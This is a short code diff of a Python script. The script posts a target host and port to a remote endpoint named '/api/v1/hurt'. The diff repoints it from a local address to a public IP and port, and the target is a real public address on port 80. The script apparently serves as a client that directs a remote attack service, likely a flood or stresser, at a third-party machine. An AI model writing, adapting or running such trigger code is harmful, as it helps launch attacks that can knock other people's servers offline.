@@ -7,11 +7,11 @@
 import requests
 
 
-url = 'http://0.0.0.0:5544/api/v1/hurt'
+url = 'http://82.157.105.137:1999/api/v1/hurt'
 
 data = {
     'host': '8.130.26.206',
     'port': '80',
 }
 dd = requests.post(url, data=data)
-print(dd.text)
+print(dd.json())
